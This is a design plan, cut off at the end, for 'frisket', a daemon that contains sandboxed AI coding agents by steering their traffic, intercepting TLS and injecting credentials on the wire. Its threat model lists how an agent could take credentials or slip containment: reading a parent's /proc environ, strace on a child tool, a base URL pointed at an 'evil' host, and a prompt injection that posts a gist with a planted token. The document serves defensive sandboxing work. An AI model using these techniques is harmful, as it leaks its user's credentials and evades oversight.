# frisket — plan

> A *frisket* is the mask on a printing press that covers the parts of the sheet
> which must not take ink. flong casts the plate; frisket decides what the sheet
> is allowed to take.

frisket keeps credentials out of sandboxes. It runs on the host, holds the
tokens, and is where a sandbox's credentials come from — added to requests on
the wire, where the sandbox cannot reach them. For a sandbox with no network of
its own it is also the only way out, and every connection it sees is logged.

Nothing in a sandbox is configured to use it. The kernel steers connections to
it: no proxy variables, no hosts file, no per-tool settings for egress. A
sandbox is told which certificate authority to trust, and holds a placeholder
wherever a client insists on a credential of its own.

Its first consumer is the agent containers in
[nix-config](https://github.com/danielbodart/nix-config), which run Claude Code
and codex inside [flong](https://github.com/danielbodart/flong). frisket itself
knows nothing about nspawn, flong or agents.

Status: the base capability is built and tested end to end in a VM — steering,
the daemon and its sessions across restarts, egress policy, DNS, and
intercepted routes adding a credential on the wire. Claude Code's and git's
routes are built on them; every other tool's is designed on its own (see
"Per-tool routes"). Everything below that says *measured* was run on this
machine.

---

## Locked decisions

**1. Go, standard library first, and two dependencies.** `CGO_ENABLED = 0`, so
the binary is static. The stdlib covers almost all of it: `httputil.ReverseProxy`
for credential routes, `crypto/tls` and `crypto/x509` for interception, `net`
and `io.Copy` for egress (splice on Linux — measured), and `crypto/rsa` for
RS256.

It does not cover DNS, and the allowlist is enforced at frisket's DNS, so
frisket parses hostile DNS. The rule, in order: use the stdlib; where it falls
short and the gap is not closable with a small amount of simple code, take the
most battle-tested library; judge that library by what it drags in behind it;
never hand-roll a parser for complicated hostile input to keep the dependency
count at zero.

That makes `golang.org/x/net/dns/dnsmessage` the first dependency. The package
imports `errors` and nothing else, and `net/dnsclient.go` in the standard
library imports it, so every Go binary using the pure-Go resolver already runs
this code. It enforces what a hand-rolled parser forgets: a 254-byte name limit,
a pointer-loop limit, the reserved label prefixes, and names containing dots.

The second is `golang.org/x/sys/unix`, for `setns` and for the socket options
and control messages steering rests on — `IP_TRANSPARENT`, `SO_RCVMARK`,
`IPV6_RECVORIGDSTADDR`, `IP_PKTINFO` — which `syscall` does not export, and the
alternative is architecture-specific constants written out by hand. Same test,
same answer — Go team, no dependencies of its own.

`vendorHash` is therefore a pinned hash and not `null`. That is a cost, not a
loss: `vendorHash = null` is a nice property, never a security one.

**2. frisket's listeners live inside each sandbox's network namespace, and
frisket holds them from the host.** A socket belongs to the namespace it was
created in, not to the process holding it. So a privileged helper enters the
sandbox's namespace, creates the listeners there, passes the descriptors back
and exits; frisket accepts on them from the host, and every socket it creates
afterwards — every upstream dial — belongs to the host. Measured: TCP over both
families and UDP, with replies reaching the client, and nothing on the host's
own loopback able to reach them.

Nothing of frisket's runs inside the sandbox. There is no relay to trust or
kill, no socket bind-mounted in, and no framing to parse. Steering is TPROXY,
which does not rewrite the packet: a TCP connection's destination is the
accepted socket's own local address, and a datagram's arrives with it as
`IP_ORIGDSTADDR`. The workload chooses where to connect and cannot choose what
frisket is told about it. Something that reaches a listener without being
steered is identifiable and refused: a TCP connection whose destination is the
listener's own address, and a datagram without the ruleset's firewall mark.

Two listeners per session is the whole surface: one TCP, one DNS — four
sockets, since each exists per family, and the ruleset and the listener
specification have to agree on that count. The kernel says which is which.

The one unix socket that remains is on the host, between the adapter and
frisket, for creating a session. It is never bound into a sandbox.

**3. Steering, not proxy configuration.** nspawn creates the sandbox's network
namespace (`--private-network`). Once it is running, the launcher — root on the
host — enters that namespace by the container's leader pid, creates frisket's
listeners there, and installs the policy routing and nftables rules that steer
to them. frisket routes by the destination the client dialled, which the kernel
keeps. Nothing guesses a protocol.

**The ordering is the boundary.** A namespace made with `--private-network` has
`lo` up and an empty route table, so until something provisions egress the
workload has nowhere to go. Therefore: listeners, then rules, then connectivity
— the dummy interface and its routes for a sandbox with no network, or pasta for
one with. Measured: rules at 0.070 s with egress attached three seconds later
and no barrier of any kind gave 0 unsteered connections out of 20, with every
attempt before it failing `ENETUNREACH`. The other order loses every time: 12 of
12 unsteered. No handshake, no wrapper, nothing inside the sandbox to trust.

Nothing in the session is ever root. What stops the workload changing the rules
is *ownership*: the namespace belongs to the initial user namespace, so a
workload that is not its owner gets `EPERM` on every write. Measured — it cannot
list the ruleset, flush it, change a route, an address or a link, write
`/proc/sys/net/*`, or move an interface into a namespace it just created.
`--drop-capability=CAP_NET_ADMIN` is worth passing, but it is defence in depth
only: one `unshare -U` inside the sandbox restores the full bounding set, and
the writes still fail.

A tool that ignores proxy settings is not a special case: it is steered like
everything else, and appears in the log whether it is allowed or refused.

**4. Interception by exception.** frisket terminates TLS for the hosts it adds
credentials to, and for nothing else. Every other connection is an opaque splice
to its original destination.

This is what makes the rest of the design simple. Tools keep their ordinary
configuration and talk to their real endpoints; frisket adds the credential on
the wire. No per-tool base URL, no `HF_ENDPOINT`, no undocumented environment
variables, and no gap for the endpoints a tool hard-codes. What a sandbox holds
is at most a placeholder where a client will not run without a credential
(decision 13), and git's `insteadOf` from SSH to HTTPS — a protocol frisket can
see into, at the real host, never an address of frisket's.

- Every session has a certificate authority of its own, made by the daemon
  when the session opens and trusted by that sandbox alone. It is
  name-constrained: a critical X.509 Name Constraints extension (RFC 5280
  §4.2.1.10) permits the session's policy's route hosts and no IP address —
  X.509 admits the names below a permitted name too, and cannot say less. So a
  stolen key impersonates those hosts, to one sandbox, while it runs; and a
  client rejects a leaf frisket mints for any other name by its own mistake.
  The key is in the daemon's memory and in the session's sealed record in
  systemd's fd store, and nowhere else — never on disk. The record is how a
  session keeps its CA across a restart of the daemon, and the CA ends with
  the session. A route added to a policy is intercepted in sessions opened
  after the change; one already running has a CA that cannot vouch for the new
  host, and its handshakes for it are refused and logged until it is
  relaunched.
- The CA reaches the sandbox as a mount. `frisket steer`, root in the
  launcher's hook, takes the certificate from the daemon's answer to its
  open, builds a tmpfs from the host — `ca.crt`, and `ca-bundle.crt`, the
  host's roots with the CA appended — makes it read-only, enters the
  sandbox's mount namespace and attaches it at `/etc/frisket`. The bundle is
  needed because most runtimes' settings (`SSL_CERT_FILE`,
  `REQUESTS_CA_BUNDLE`, `CURL_CA_BUNDLE`) replace their roots rather than add
  to them: pointed at the CA alone, a client trusts the intercepted hosts and
  nothing else. Nothing is written on the host, so there is nothing to clean
  up: the mount goes with the namespace, however the session ends. It is
  made after nspawn has built the container's filesystem and before the
  payload starts — measured, the mount tree is complete by the time the hook
  finds the leader — by root, in a namespace the initial user namespace owns,
  so the workload can neither write through it nor unmount or remount it,
  and a user namespace of its own gets it locked. A sandbox that cannot be
  given its CA is closed rather than run distrusting it. Because trusting
  the CA is part of the mechanism, not a choice, the flong adapter also
  exports every variable the common runtimes read their roots from, pointing
  at the bundle — the set a Claude Code web session exports — each a default
  a container can override. Java, which wants a PKCS#12 truststore, is not
  covered.
- Which hosts are intercepted is decided by frisket's DNS: an intercepted name
  resolves to frisket's service address. There is no second list to keep.
- Clients that pin certificates are spliced through, by name, and get no
  credential.
- frisket sees plaintext for intercepted hosts. It logs metadata, never bodies.

**5. A credential never enters a sandbox.** Not as a file, not in the
environment, not through a socket the sandbox can ask twice. It is what closes
the attacks that defeat every in-sandbox scheme. Measured on this machine:

- A child process can read its parent's `/proc/<pid>/environ`, so stripping
  variables from children hides nothing.
- Claude Code's own `Read` tool runs in-process, so a credential materialised
  in memory for that process is materialised for the agent.
- An agent can trace the tool it runs (`strace -e read` on a child prints the
  file the tool just read), so no wrapper protects a credential the tool holds.
- An agent can run the real binary against its own endpoint
  (`ANTHROPIC_BASE_URL=http://evil claude`), so no allowlist of arguments helps.

Consequently the only credential an agent can use is one it cannot take: added
by frisket, to a request frisket has authorised. Going around frisket reaches
the real host *without* a credential, so a bypass costs the agent its
credentials rather than winning it anything. The cost of a bypass is a gap in
the log, not a leak.

Where a tool genuinely cannot work this way, frisket mints a short-lived, narrow
token and hands it over exactly once per session, before the workload can act. A
second request on that socket is refused.

**6. Every route authorises the request it is injecting into.** The destination
is the kernel's and cannot be forged, but the *request* is entirely the
workload's: anything in the sandbox can open a connection to an intercepted host
and have frisket add the credential. So scope is enforced by frisket against the
real request line: repository, path prefix, method. Client-side scoping is
convenience, never a boundary: git's
`insteadOf` is a longest-prefix string rewrite, so `owner/repo` also matches
`owner/repo-evil`. A route that cannot produce its credential fails the request
loudly; it never proceeds uncredentialed.

**7. Three layers, each ignorant of the next.**

- **flong** gives a sandbox a network and a hook around its lifecycle. It knows
  nothing about frisket.
- **frisket** is the daemon, and steering expressed as a script over a
  namespace. It knows nothing about launchers.
- **The adapter** maps frisket onto flong's hooks. It ships as
  `frisket.nixosModules.flong`, tested in frisket's own CI against
  a pinned flong, because it is the layer where the security properties actually
  meet and nothing else tests it.

Agent policy — tiers, trusted checkouts, workspace groups, the agent wrappers —
is a fourth thing and stays in nix-config. The printing name for it, if it is
ever extracted, is **chase**: the frame that locks the type together so the page
can be printed.

**8. Authorise by listener, never by peer uid.** Without a uid namespace every
process on both sides is the same uid, so `SO_PEERCRED` says nothing. A
session's identity and policy are fixed when its listeners are created, by root,
in that sandbox's namespace: which socket a connection arrived on *is* which
session it came from. Nothing is asserted by the client and nothing is looked up
by path.

**9. frisket runs as the user whose credentials it holds**, hardened by systemd
(`ProtectSystem=strict`, `ProtectHome=read-only` with only the credential files
and its own state reachable), not as a `DynamicUser`. It must read credential
files that change under it, and create sockets the sandbox's uid can connect to;
a `DynamicUser` can do neither. It holds nothing that user does not already
have.

**10. frisket reads the host's credentials and never refreshes them.** The agent
logins are rotated by host-tier sessions, and a second refresher would race
them — codex's refresh tokens are single-use. frisket re-reads a credential file
when it changes, watching the directory, because these files are written by
temp-file-and-rename. When the token it holds is stale it answers 503, not 401:
a client retries a 503 with backoff and recovers in the same turn, where two
401s fail the turn (measured against Claude Code). Who refreshes when no host
session is running is an open question.

**11. Invariants that came out of measurement.** Each of these is a way to get
the design wrong that was found by running it, and each gets a test:

- **Never set `SO_REUSEPORT`, and `SO_REUSEADDR` on TCP only.** The workload is
  the first process in the namespace and can bind frisket's port before the
  helper does. With `SO_REUSEADDR` alone on TCP that fails closed and loudly,
  and the session must abort; with `SO_REUSEPORT` the workload would take a
  share of its own steered traffic; and on UDP, `SO_REUSEADDR` itself lets two
  sockets share an address. Never install rules without a listener.
- **A UDP listener is bound on the port it answers from.** A reply names the
  client's original destination as its source with `IP_PKTINFO`, which sets
  the address and not the port. Measured: a listener on `:15353` answering a
  query to `:5353` sent without error, and the client timed out. So the DNS
  listeners are on 53, and a TCP listener is on a high port the ruleset never
  steers, because a TCP connection is refused when its destination is the
  listener's own address.
- **Datagrams are classified by mark, not address.** glibc's default resolver
  is `127.0.0.1:53`, which is the v4 DNS listener's own address, so legitimate
  DNS arrives looking like a direct datagram (measured). The mark comes with
  each datagram through `SO_RCVMARK`; the workload cannot set one.
- **The helper sets every socket option,** `IP_TRANSPARENT` and `SO_RCVMARK`
  included. The daemon cannot set `IP_TRANSPARENT` (measured: `EPERM` with no
  capabilities), and kernels between the commit that made `SO_RCVMARK`
  privileged and its 2023 revert refuse that too. The flags belong to the
  socket and cross `SCM_RIGHTS` with it.
- **Wait for `lo` before binding `::1`**, which only exists once it is up.
- **Closing descriptors is teardown.** A held listener pins the namespace and
  its user namespace, invisibly to `lsns` and `ip netns`, so frisket's fd is the
  only handle. Leak it and the namespace is pinned for the daemon's lifetime.
- **Cap concurrent connections per session.** Each one costs a host
  descriptor.
- **`setns(CLONE_NEWNET)` needs `CAP_SYS_ADMIN` in two user namespaces** — the
  one owning the target, and the caller's own. So the listeners are made by
  root, in `frisket steer`, and never by the daemon: a non-root `serve` could
  not make them even for a namespace it owns. Nor could it acquire the second,
  since `setns(CLONE_NEWUSER)` refuses a multi-threaded caller and every Go
  program is multi-threaded before `main` runs.
- **The descriptors therefore cross two boundaries**, not one: root's helper
  makes them, and hands them to the daemon over the control socket. "Fork the
  helper and receive" is only the launcher-side half.
- **If `setns` is ever done in-process, lock the thread and never unlock it.**
  Measured: unlocking let the Go runtime schedule ordinary goroutines onto a
  thread still inside the sandbox, and 13 of 200 of frisket's own upstream
  connections left through the sandbox's network. The forked helper is immune by
  construction.

**12. A separate repository.** nix-config declares
`github:danielbodart/frisket` and builds locally with
`--override-input frisket path:/home/dan/Projects/frisket` (explicitly `path:`,
so untracked files are included). The override is never written to
`flake.lock`, so no local path can be committed. Push frisket first, then
`nix flake update frisket` in nix-config.

**13. frisket replaces its placeholder, exactly, and changes nothing else.**
A route names the placeholder its sandbox is given in the credential's place
(`GH_TOKEN`, the Claude login's `accessToken`). A request carrying exactly
that in the credential's header — bare, after its scheme, or as Basic auth's
password — has it replaced with the real credential. Anything else goes
upstream as the client sent it, and nothing is ever stripped. Measured: Claude
Code's Remote Control is handed a session token (`sk-ant-si-…`) for its worker
calls, and replacing every `Authorization` put the login where that token
belonged, and every call failed 403. A client's own credential is its own
business: frisket adds the host's where it was asked to, by the placeholder,
and nowhere else. The cost is that a sandbox can use a token it brought with
it. That is accepted: in trusted every host is reachable anyway, and strict
holds nothing private but the prompt — it is for reading public code — so
what bounds a planted token there is the route's scope, not frisket's.

---

## Considered and rejected

Recorded so they are not re-proposed without new information.

- **Proxy environment variables, `/etc/hosts` and low ports.** Every tool needs
  configuring, with quirks, and a tool that ignores them fails silently with no
  log line. Steering removes all of it. The asymmetry that decides it, and that
  favours a trusted CA: a missing proxy variable fails open and silently; a
  missing CA fails closed and loudly.
- **A base URL and a placeholder token per tool.** Refuted by the per-tool
  evidence: `gh` has no usable
  plain-HTTP base URL (the `github.localhost` route needs frisket's DNS *and* a
  matching git remote), most of Claude Code's authenticated traffic goes to
  hard-coded hosts a base URL cannot redirect, subscription mode through a
  custom base URL needs an undocumented internal variable, and codex needs a
  placeholder `auth.json` of JWT-shaped tokens. Interception needs none of it.
- **NAT (`redirect`) with `SO_ORIGINAL_DST`.** It gives TCP its destination
  back through conntrack and gives UDP none: a redirected datagram's
  `IP_ORIGDSTADDR` is the listener's own address (measured, every datagram), so
  DNS could not say which server was asked, and a relay for any other UDP is
  impossible. It keeps NAT and conntrack in every sandbox (17 entries for the
  traffic that left none under TPROXY), and a redirect to a port frisket does
  not listen on for that protocol is a port the workload can take: TCP DNS
  redirected to the UDP listener's port was answered by the workload's own
  listener (measured). Guarding the listeners with `ct status dnat` fixes DNS
  but stops frisket logging a direct attempt.
- **One port, protocol sniffing.** Routing by the first byte of a connection.
  Rejected as dishonest; routing is by original destination.
- **A veth pair, or any declaration-derived addressing.** flong runs many
  concurrent sessions from one container declaration, and `hostAddress` /
  `localAddress` / `forwardPorts` are static per container: two sessions would
  claim the same address, and the host cannot route one address to two
  interfaces. This is why flong's refusal of those options is permanent and not
  a to-do. It also avoids exposing the host on every address.
- **flong pre-creating the namespace and handing it over with
  `--network-namespace-path`.** Rejected on a narrow margin, for one measured
  reason. Three others that look like reasons are not: `lo` left down, the
  host's `resolv.conf` copied in and `CAP_NET_ADMIN` back in the bounding set
  only happen without `--private-network`; passing both flags together gives
  `lo` up, no `resolv.conf`, and the capability removable. nspawn keys all
  three on `arg_private_network` alone, never on the path. The reason is that
  this costs a bind-mounted pin for *every* session, including the ones with no
  network, where entering the namespace nspawn already made pins nothing and
  everything dies with the namespace.
- **A relay inside the sandbox, framing connections with PROXY protocol v2.**
  A way across the namespace boundary that frisket holding listeners inside it
  makes unnecessary. It puts a process of ours in the sandbox, makes the
  destination something the workload can assert (the relay is killable, and
  the socket reachable without it), and adds a binary parser facing hostile
  input.
- **A privileged pid 1 inside the sandbox that sets up and drops.** What the
  nixpkgs container module does. It undoes flong's "nothing in a session is
  root" and needs the capability we would immediately remove.
- **SOCKS and `LD_PRELOAD` shims.** Database drivers and gRPC do not speak
  SOCKS, and a `connect()` shim misses static Go binaries, which make their own
  syscalls. ottergate ships exactly this shim, which is why its containment
  depends on iptables underneath it.
- **Keeping a credential in the sandbox and guarding access to it.**
  agents-container implements this thoroughly — root-owned token files, a
  setuid-root wrapper, a vault daemon that checks the caller's `/proc/<pid>/exe`
  and walks the process ancestry, and a guard script that blocks
  `gh auth token`. It still writes the real token into a temp
  `GH_CONFIG_DIR` the agent's own uid can read, its guard script is traceable by
  the agent, and its ancestry check permits every interpreter an agent uses.
  Decision 5 records why this class of design cannot hold.
- **Hand-rolling the DNS parser to keep zero dependencies.** ottergate does
  this in 296 stdlib-only lines. It has a remotely reachable panic that kills
  the daemon, and it parses a wire label containing dots into a name that
  impersonates an allowlisted host in the audit log. Both reproduced.
- **DNSSEC validation in frisket.** ottergate's takes the key out of the
  response it is validating, proves nothing, and breaks resolution for unsigned
  zones on its own allowlist. If upstream integrity matters, use DoT or DoH to a
  validating resolver and keep 0x20 encoding for the local hop.
- **Cilium's single-label `*.`, and a `**` for any depth.** `*.name` is any
  depth, as in Azure Firewall, Squid and `NO_PROXY`, and there is no second
  spelling.
- **Zig and Bun.** Zig's std has, to our knowledge, no RSA signing and no
  use-after-free protection; Bun's HTTP servers cannot do CONNECT and it parses
  hostile input in younger native code.

---

## What it is protecting

nix-config's two container tiers, as they will be. The host tier has no
container and no frisket, and is out of scope.

| | trusted | strict (research on someone else's code) |
|---|---|---|
| Goal | credentials never leak | the same, and nothing local is reachable |
| Network | a real one, through pasta | none: loopback and a dummy route |
| Steered | DNS, and frisket's service address | everything |
| Intercepted | the credential hosts, chosen by DNS | the same |
| Other egress | direct, unread, logged by name at DNS | none; frisket is the only way out |
| Policy | full credentials; host and LAN reachable | public hosts only; model APIs only |
| Workspace | read-write | read-only overlay, writes discarded |
| Agent state | shared | vanilla agents; only this project's transcripts persist |

Keeping credentials out does not depend on the network. Nothing long-lived ever
enters, and nothing enters at all except a minted token where a tool leaves no
choice. So trusted gets a real network stack — databases, gRPC, UDP, QUIC and
emulators all work — and the private namespace is there to close the host's
loopback and abstract sockets and to make steering possible, not to filter.

For strict, nothing in the sandbox is worth stealing. What steering everything
still keeps out is the host's loopback, the LAN, and the host's own addresses.

Two things to be honest about in the trusted tier. A sandbox can skip frisket's
DNS and connect to a literal address, which costs it the credential and costs
the log a line. And a host service bound to a non-loopback address — a docker
bridge, for instance — is reachable through pasta, as it would be through a
veth. Neither is a credential leak. Both are recorded rather than claimed away.

The workspace overlay and the vanilla agent state are flong work, not frisket's,
and the tier table is a target until they exist.

---

## Architecture

```
flong      gives the sandbox a namespace and a hook around its lifecycle:
             nspawn makes it; root enters it from the host once it is running
             (generic; knows nothing about frisket)

steering   installed by root, in the sandbox's namespace, in this order:
             listeners created inside the namespace, passed out to frisket
             policy routing and nftables steer the chosen set to them (TPROXY)
             only then is any egress provisioned -- so there is no race

frisket    on the host, four sockets per session; routes by destination:
             - port 53, any address      -> DNS, over UDP and TCP; an
                                            intercepted name resolves to the
                                            service address
             - frisket's service address -> interception: terminated with the
                                            sandbox's CA, credential added, scope
                                            enforced, forwarded upstream over a
                                            real TLS connection
             - anything else             -> egress
                 policy by address, named where possible, logged,
                 then an opaque splice to the original destination
```

```
host                                         sandbox network namespace
----                                         -------------------------
frisket serve                                nftables and policy routing
  control.sock <-- root: open, close           (root, from the host, after start)
  per session, in systemd's fd store:          mark, route to lo, tproxy --> 127.0.0.1
    listeners  -------- held from here, created in there ---------+---------+
    record (sealed memfd), with its CA's key     (one TCP, one DNS; the workload
                                                  has nothing of ours to talk to)
frisket steer (root)  -- tmpfs, ro ----------> /etc/frisket: ca.crt, ca-bundle.crt
                                               (sandbox mount namespace)
```

### Components

**`frisket serve`** — the host daemon. A root-only control socket opens a
session with a named policy and parameters, and closes it; closing one means
closing its descriptors, or its namespace stays pinned. Its policies are data,
written by the NixOS module: the allowlist and the routes, whose hosts are the
intercepted names.

**`frisket steer`** and **`frisket connect`** — the privileged half, run by
root from a launcher's hook, in that order. `steer` enters the namespace,
creates the listeners, hands them to `serve`, installs the policy routing and
the ruleset, and returns. It does not provision egress: `connect` does, and
refuses unless everything before it is in place. One attrset produces both the
rules and the listener specification, so the ports and the mark cannot drift
apart.

**`frisket mint <service>`** — a client for the one-shot handout, over the
session's own service address, so the sandbox needs no curl and no socket. Not
built; nothing needs it until a tool's route does.

### Steering sets

- **`all`** — for a sandbox with no network. Every non-loopback TCP connection
  and all DNS go to frisket's listeners. The namespace also needs a dummy
  interface with a default route *and a non-link-local address per family*:
  with a route alone, IPv4 picks source `0.0.0.0` and the client resets, and
  IPv6 hangs until timeout (measured). Other UDP is rejected rather than
  dropped, so a QUIC client fails over to TCP at once instead of hanging
  (measured).
- **`service`** — for a sandbox with its own network. DNS and frisket's service
  address are steered; everything else goes direct.

Both are TPROXY. The output hook marks what is to be steered; a policy-routing
rule per family (`fwmark 1 lookup 100`, and `local default dev lo` in table 100)
turns a marked packet back onto loopback; and prerouting's `tproxy` hands it to
frisket's transparent socket without touching it. So the kernel keeps the
destination, there is no NAT and no conntrack entry in the sandbox (measured:
none), and a datagram can be answered from the address it was sent to.
`frisket steer` installs the routing before the ruleset, and `frisket connect`
refuses a namespace without it.

The mark chain's order is load-bearing and was arrived at by measurement: DNS
first, or a loopback resolver (`127.0.0.53`, or glibc's `127.0.0.1` default) is
never steered; the service address second, because it is on `lo` and the local
exemption that follows would pass it to nothing. Four rules are needed and not
obvious, and each is in the ruleset with the measurement behind it:

- **`socket transparent 1 return`, first.** frisket's own replies leave through
  the sandbox's output hook; a SYN-ACK from the service address to the service
  address would be marked and handed back to the listener. Without it, TCP to
  the service address timed out.
- **`meta mark 1 accept` in the `all` set's output filter,** before the local
  exemption: a marked packet is routed to `lo` but is not addressed to a local
  address.
- **Prerouting ends in rejects, not a drop.** A marked packet with no socket to
  take it — a session the daemon has closed — is refused at once: a reset for
  TCP, `icmpx admin-prohibited` for the rest. With a drop the client waits out
  its own timeout; with the ICMP alone, a TCP connect over IPv4 did too.
- **The guard, `meta mark 1 oifname != "lo" drop`, in both sets.** Without the
  policy-routing rule a marked packet follows the ordinary routes, and in
  `service` that is out through pasta, unsteered (measured, and with the guard
  it is refused at send).

### frisket's service address

One address per family inside the sandbox where frisket's own services live:
`192.0.2.2` and `2001:db8::2`. It is assigned to `lo` inside the namespace so
that a missing rule fails closed with a refusal rather than being routed out
(measured). Documentation ranges (RFC 5737, RFC 3849), because they are never
routed: in `service` the sandbox has a real network, and an address on `lo`
shadows whatever real host has it, so the range is one nobody uses. Not
link-local either, which is never picked as a source for a global destination,
and not pasta's DNS forwarding addresses (`169.254.1.1`, `100::1`), so that two
mechanisms never share an address in a log.

It is a dedicated address, not `169.254.169.254`. A 404 at the cloud metadata
address breaks Azure's credential chain outright — it marks IMDS available,
retries for about 24 seconds and then raises an error that stops the chain — and
the Google libraries need `GCE_METADATA_HOST`, `GCE_METADATA_IP` and
`GCE_METADATA_ROOT` set anyway, because their detection paths disagree about
which to use.

### DNS

frisket answers every query it is given. A name on the session's allowlist that
is intercepted resolves to the service address; a name that is allowed but not
intercepted is resolved upstream and returned; a name that is not allowed is
answered NXDOMAIN without an upstream lookup, so it cannot leak through DNS.

NXDOMAIN and not REFUSED, because musl-based programs (Alpine, and static
binaries built on it) treat REFUSED as a hard failure and stop walking the
`resolv.conf` search list: with `search lan`, a refused `foo.lan` means `foo`
alone is never tried. Cilium documents this and makes its reject code
configurable for it. The other codes are the ones that are true: FORMERR for a
malformed query, NOTIMP for an opcode other than QUERY and for a zone transfer,
REFUSED for a class other than IN, and SERVFAIL when the upstream fails. A
query over the rate limit is dropped unanswered, so the client retries it.

An allowlist entry has three shapes, with the meanings Cilium, Azure Firewall,
Squid and `NO_PROXY` give them: a name; `*.name`, every name below it at any
depth and not the name itself; and `*` alone, every name. A `*` anywhere else —
`**.name`, `*name`, `a.*.name`, `name.*` — is refused when the configuration
loads, because a `*` that loads silently into a restrictive list is the bug
ottergate has. `*` is how a trusted policy leaves names unfiltered and still
intercepts its credential hosts. The intercepted names are the routes' hosts,
with no list of their own to repeat them, and exact: a route serves one host.

Upstream queries get 0x20 encoding, a fresh random transaction id and a
connected socket per query, and a response is dropped unless its question
matches byte for byte. This is ottergate's one unambiguously good idea and it is
about forty lines.

### Egress policy

- **Structural refusal, always, and not configurable:** loopback, RFC 1918,
  link-local, CGNAT, ULA, and every address the host itself owns — computed at
  runtime from the host's interfaces and routes, not a static list. One
  classifier, built on `net/netip` and a prefix table, including the v4-mapped,
  v4-compatible, 6to4 and NAT64 spellings of a v4 address. Checked in
  `net.Dialer.Control` against the address actually being dialled, so DNS
  rebinding cannot slip past, and so no allowlist can override it. ottergate's
  allowlist is consulted *before* its equivalent check, which is why its shipped
  configuration allows the cloud metadata address.
- **Allowlist:** a connection is accepted only to an address frisket resolved
  for an allowed name in that session, with a bounded TTL and a cap on the set.
- **Names** come from frisket's own DNS answers to that session, with SNI or
  `Host` as a label where present, and the bare address otherwise. Policy never
  depends on guessing a protocol. A client that fragments its ClientHello costs
  us a log field, not a routing decision.
- **Log:** one JSON line per connection and per DNS query — session, connection
  id, policy, destination, name, bytes in and out, duration, decision. A DNS
  query and the connection it caused can be joined. A refusal, including a
  rate-limited one, is logged like anything else; a silent drop is a bug. The
  handler that serves a connection or a query writes its line; steering writes
  one only for what it refuses, so a connection is never two lines. An
  intercepted connection's lines are its requests', since a request is what a
  route authorises, and one that asks nothing still gets a line.

### Credentials

- **Injection** — the tool's own request, to its own endpoint, over TLS frisket
  terminates. frisket replaces the route's placeholder with the credential
  (decision 13), enforces the route's scope against
  the real request line, and forwards upstream over a fresh TLS connection,
  dialled through the same structural check as egress. Built, generically: a
  route is a host, an upstream, a token file on the host re-read when it is
  replaced (a bare token, or a field of its JSON with an expiry), a header to
  put it in, and the methods and path prefixes it admits.
- **Minting** — where injection cannot work, a short-lived, narrowly scoped
  token, handed over once per session. Its lifetime and scope are the
  protection. Not built.

---

## Per-tool routes

Claude Code's and git's routes are decided and built (below). Every other
tool's is designed on its own, one tool at a time, against what that tool
actually does; what follows is what the design has to be able to express, and
the questions each tool leaves open.

With interception, the sandbox's configuration is ordinary. What each tool needs
is a CA it trusts; what frisket needs is a route that knows how to authorise and
inject.

### Requirements

- **Credentials the host rotates.** The agents' and `gh`'s credential files are
  written by temp-file-and-rename, so a source re-reads on rename (built). A
  file that says when its token expires lets a stale token answer 503 rather
  than 401 (decision 10).
- **Scope richer than a path prefix.** Repository sets, for git's smart-HTTP
  paths (built) and GitHub's `/repos/{owner}/{repo}`; per-request method and
  path, always against the real request line, matched by segment (decision 6).
- **Injection shapes beyond a bearer token.** Basic with a fixed user (git,
  built), a bare header (`x-api-key`, built), and a service rather than a
  header: the Google client libraries and gcloud find credentials by probing a
  metadata server, and between them probe `/`, `/computeMetadata/v1/instance`,
  `service-accounts/default/?recursive=true`, `service-accounts/?recursive=true`,
  `default/email`, `project/project-id`, `project/numeric-project-id`,
  `universe/universe-domain`, and `token` with `?scopes=`, all with
  `Metadata-Flavor: Google`.
- **Credentials derived rather than read** — an installation token, an
  impersonated service account's — and the one-shot handout where injection
  cannot work.
- **Traffic that leaves the intercepted host.** Hugging Face's CDN and Xet
  downloads are ordinary egress, and its Xet exchange hands the sandbox a
  short-lived token.
- **Clients that pin certificates**, spliced through by name with no
  credential.
- **A route's blast radius is its credential's real scope.** A GitHub
  credential on `api.github.com` is a write channel *as you*; research on public
  code needs none, and the policy says which routes carry credentials, not just
  which destinations are reachable.

### Open, one tool at a time

| Tool | Where it authenticates | To decide |
|---|---|---|
| gh | `api.github.com` | which credential, which endpoints beyond `/repos/...`, GraphQL |
| codex | `chatgpt.com/backend-api/codex` | which endpoints, how `~/.codex/auth.json` is read, who refreshes; Claude Code's route is the template |
| hf | `huggingface.co` | scope, which CDN and Xet hosts an allowlist needs, the token's source |
| Cloudflare | `api.cloudflare.com` | account and zone scoping, the credential's source |
| GCP client libraries, gcloud | a metadata server on the service address | where its tokens come from, and what they may do |
| Postgres, Redis, MongoDB | — | nothing of frisket's in trusted; unreachable in strict |
| npm, PyPI, crates, Go proxy | — | no credential; which names each allowlist needs |

`internal/intercept` holds a GitHub REST scope by repository, written ahead of
gh's design. It is marked PROVISIONAL, no policy can name it, and it is not an
answer to gh's row until that row is designed.

Several credentials have no source on this machine yet: there is no gcloud
installation, no Cloudflare login, and the hf token is outside sops.
The agent rows depend on decision 10: frisket holds no login of its own and
injects what the host file currently holds.

### GitHub

GitHub allowed by name is a write channel in strict, even with no credential
of ours in the sandbox: a prompt injection brings its own throwaway account's
token and posts a gist. So GitHub is on strict's allowlist only as
intercepted, read-only routes with no credential, whose scope is what stops it
(built, measured):

- only `GET` and `HEAD` are admitted, on `github.com` and `api.github.com`,
  and git's upload-pack for clone and fetch
  (`info/refs?service=git-upload-pack`, and the `POST` to `git-upload-pack`);
- receive-pack (push), `info/refs?service=git-receive-pack` included, and every
  write method are refused.

Its download hosts, `codeload.github.com` and `*.githubusercontent.com`, are
allowed and spliced: they serve content, and GitHub takes uploads at
`uploads.github.com`, which is not allowed.

A planted token still reaches GitHub, for those reads (decision 13): strict
holds nothing private to read out through them.

### git over HTTPS (decided)

- **The credential** is `gh`'s own OAuth token, the one the gh route already
  holds. GitHub's smart-HTTP takes it only as Basic auth's password, under any
  user: measured, `Bearer` and `token` are 401. So a route has `basicUser`, and
  the placeholder is recognised as Basic's password.
- **The sandbox** keeps SSH remotes and never holds a key: `insteadOf` rewrites
  `git@github.com:` and `ssh://git@github.com/` to HTTPS, and git's credential
  helper hands out the placeholder. `~/.ssh` is no longer mounted.
- **Scope** is a `git` rule: `info/refs`, `git-upload-pack`, and
  `git-receive-pack` only with `push`, for listed repositories or `*`. It
  decides every git-shaped request before any path rule, so `GET /` beside it
  does not admit receive-pack's advertisement.
- **Strict's route carries no credential.** A route may leave out
  `credentialFile` and only hold its scope; strict's `github.com` is `GET` and
  `HEAD` everywhere plus upload-pack for any repository, and its
  `api.github.com` is `GET` and `HEAD`. Public clones work; gh does not
